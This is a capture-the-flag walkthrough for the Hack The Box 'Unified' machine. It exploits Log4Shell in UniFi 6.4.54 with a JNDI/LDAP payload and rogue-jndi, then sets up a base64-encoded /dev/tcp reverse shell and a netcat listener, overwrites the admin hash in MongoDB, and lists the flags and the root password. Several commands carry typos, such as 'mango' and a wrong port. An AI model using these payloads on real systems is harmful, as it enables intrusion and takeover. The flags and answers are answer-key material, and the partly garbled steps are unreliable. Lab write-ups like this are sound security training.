# README

## Starting Point

* Start the machine by downloading the OpenVPN file provided by HTB.

```bash
sudo openvpn <filename.ovpn>
```

{% stepper %}
{% step %}
### Enumeration

Let’s fire up the machine and do an NMAP scan.

```bash
sudo nmap –sV –p- --min-rate 10000 –Pn <target-IP>
```

* TTL value refers to Linux.
* An NMAP scan reveals that there are three ports open: `22`, `6789`, `8080`, and `8443`.

**TASK 1**\
Which are the first four open ports?

**Answer:** `22,6789,8080,8443`

Aggressive scan to get more details on custom ports.

* Searchsploit doesn’t show any known exploit for the Nmap scan results.
* Browse the HTTP service on the custom ports to check the application.
* Port `8080` returns a `404` error.
* Port `8443` works.

**TASK 2**\
What is the title of the software that is running on port `8443`?

**Answer:** `UniFi Network`

Ctrl + U for source code.

* Got the title.

**TASK 3**\
What is the version of the software that is running?

**Answer:** `6.4.54`

* On the internet, I found that UniFi `6.4.54` has a CVE. This was found on the BurpSuite side.

**TASK 4**\
What is the CVE for the identified vulnerability?

**Answer:** `CVE-2021-44228`

Log4J vulnerability.

* Nature of vulnerability: the Log4J vulnerability allows attackers to exploit a weakness by injecting operating system commands. This type of attack is known as OS command injection.
* Impact: exploiting this vulnerability enables an attacker to execute operating system commands on the server where the application is running. This can lead to complete compromise of the application and all its data.
{% endstep %}

{% step %}
### Log4j / JNDI / LDAP

**TASK 5**\
What protocol does JNDI leverage in the injection?

**Answer:** `LDAP`

**JNDI**

* Stand for Java Naming and Directory Interface API. It’s a Java API that allows applications to locate and interact with programs like database servers and message applications. By making calls to the JNDI API, applications can find the requests in time and utilize them in a standard way.

**LDAP**

* Stand for Lightweight Directory Access Protocol. It’s an open standard protocol. As the name says, it’s used for accessing and maintaining directory information services over the network which can be LAN or WAN.
* It is used to manage directories of users and to provide a way to organize, query, and update information in directories using port `389`, which is the default LDAP port.

So, the Log4j vulnerability, JNDI, and LDAP are not directly connected; however, when the Log4j vulnerability is exploited, it can misuse JNDI calls and interact with an LDAP service, which leads to communication to specific machines.

**Source ref:** https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi

**TASK 6**\
What tool do we use to intercept the traffic, indicating the attack was successful?

**Answer:** `tcpdump`

* To check if the LDAP service is running in the server, use TCPDUMP.
* The BurpSuite side interaction.

**TASK 7**\
What port do we need to inspect intercepted traffic for?

**Answer:** `389`

**TASK 8**\
What port is the MongoDB service running on?

**Answer:** `27117`

Initially, access steps to reproduce:

* The login POST seems to have `{}` which is similar in JSON format, so the POST data is being sent in JSON format, and the payload can be injected in curly brackets `{}`.
* Use the double colons so that the payloads are treated as a string and as JSON objects.
* By putting the payload into the parameters field, the aim is to identify if there is an injection point or not.
* If the payload causes the server to establish a connection back to the attacker by the given payload, which is `${jndi:ldap://{Tun0 IP Address/something}}`,
* This payload seems to be using JNDI to make an LDAP connection with the specified IP address.
* In summary, this involves an injection point where the payload is executed. In this case, it’s a POST parameter within the Username and Password fields in JSON format. If the injected payload is successful, it should trigger a connection back to the specified IP address.

**Source ref:** https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi

```bash
ifconfig
```

```bash
sudo tcpdump -i tun0 port 389
```

* `-i` is for interface.

Payload: `${jndi:ldap://{Tun0 IP Address/something}}`

* After hitting "send," the Response shows an error indicating an invalid payload. Initially, it may seem like a typographical error, but upon inspecting the tcpdump console, it becomes clear that the server establishes a connection using the default LDAP port `389`.
* As given in https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi, further exploitation requires tools to be installed, namely JDK and Maven. These tools build a payload that can be sent to the server, enabling the creation of reverse shells.

Installation of JDK and Maven.

Building the Rogue-JNDI Java application after installing:

* Clone the repository:

```bash
git clone https://github.com/veracode-research/rogue-jndi
```

* Navigate to the cloned directory:

```bash
cd rogue-jndi
```

* Build the package with Maven:

```bash
mvn package
```

* Use Maven (a software project management tool) to build the Rogue-JNDI package. This command compiles the source code, runs tests, and creates a distributable package.
* Use this as a sudo privileges.
* Reverse Bash Shells
* It can be generated in revshell.online.

```bash
bash -c bash -i >&/dev/tcp/{IP Address of Attacker}/{Port} 0>&1
```

* Recommended to use URL encoding to avoid protocol rules.

```bash
echo 'bash -c bash -i >&/dev/tcp/{IP Address of Attacker}/{Port} 0>&1' | base64
```

* The echo command prints the Bash command, and the `|` (pipe) symbol sends its output to the base64 command.
* Base64 is a tool for encoding binary data as ASCII text using the Base64 encoding scheme.

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo, bash64code} | {base64,-d}|{bash -i}" --hostname "Attacker IP"
```

* BurpSuite:
  * Going back to the intercepted POST request, change the payload to `${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}` and click Send.
* After sending the request, a connection to the rogue server is received and the following message is shown.
* Sending LDAP ResourceRef result for `o=tomcat` with `javax.el.ELProcessor` payload.

```bash
nc -lvp 80
```

* Once the output from the rogue server is received, a shell spawns on the Netcat listener. It can be upgraded using the following command:

```bash
script /dev/null -c bash
```
{% endstep %}

{% step %}
### MongoDB Enumeration and Privilege Escalation

**TASK 9**\
What is the default database name for UniFi applications?

**Answer:** `ace`

* Got the answer from the internet.

**TASK 10**\
What is the function we use to enumerate users within the database in MongoDB?

**Answer:** `db.admin.find()`

* LinPEAS enumeration failed.
* MongoDB is a cross-platform NoSQL database using JSON-like documents. We'll use the `mongo` command line to interact with it and attempt to extract the administrator password. A Google search reveals the default UniFi database name as `ac`.
* Function to view the user in MangoDB:

```bash
mango --port 27717 ace --eval "db.admin.find().forEach(printjson);"
```

**TASK 11**\
What is the function we use to update users within the database in MongoDB?

**Answer:** `db.admin.update()`

* The output shows a user named Administrator with a password hash in the `x_shadow` variable. Though uncrackable, we can replace it with our hash using the `mkpasswd` utility. The `$6$` signifies SHA-512 hashing, requiring us to create a hash of the same type for the replacement.

```bash
mkpasswd -m sha-512 (password) shadow
```

* Let’s proceed to replace the existing hash with the one we created.

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")}, {$set: {"x_shadow": "SHA_512 Hash Generated"}})'
```

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")}, {$set: {"x_shadow": "$6$8aCNSk56TGeCJ4N9$QjHcGGbrxdHi8tNqNUOWWmf.84KmvcCcjlLntrH/zQFO5eF.pyUzusr4W607p.EuZY/pEm3gawooJVl10ddg2/"}})'
```

* Verify the hash is updated:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

**TASK 12**\
What is the password for the root user?

**Answer:** `NotACrackablePassword4U2022`

* The logging is successful now to view the password of Administrator.
* The page shows the root password in plaintext as `NotACrackablePassword4U2022`.

Submit user flag

**Answer:** `6ced1a6a89e666c0620cdb10262ba127`

Submit root flag

**Answer:** `e50bc93c75b634e4b272d2f771c33681`

* Let’s attempt to authenticate to the system as root over SSH.
* Username: `Administrator`
* Password: `NotACrackablePassword4U2022`
{% endstep %}
{% endstepper %}
